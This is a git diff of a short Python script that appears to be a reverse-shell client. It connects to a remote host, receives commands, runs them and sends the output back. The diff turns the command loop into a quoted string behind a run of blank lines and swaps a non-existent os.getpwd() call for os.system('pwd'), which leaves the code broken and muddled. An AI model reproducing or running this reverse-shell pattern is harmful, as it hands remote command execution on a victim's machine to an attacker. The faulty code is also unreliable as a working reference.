@@ -14,11 +14,24 @@ s = socket.socket()
 # connect to the server
 s.connect((Host, Port))
 
-pwd = os.getpwd()
+pwd = 'pwd'
+os.system(pwd)
+
 s.send(pwd.encode())
 
 while True:
-    # receive the command from the server
+
+
+
+
+
+
+
+
+
+
+
+    '''# receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
     if command.lower() == "exit":
@@ -42,5 +55,6 @@ while True:
     # send the results back to the server
     message = f"{output}{SEPARATOR}{pwd}"
     s.send(message.encode())
+    '''
 # close client connection
 s.close()
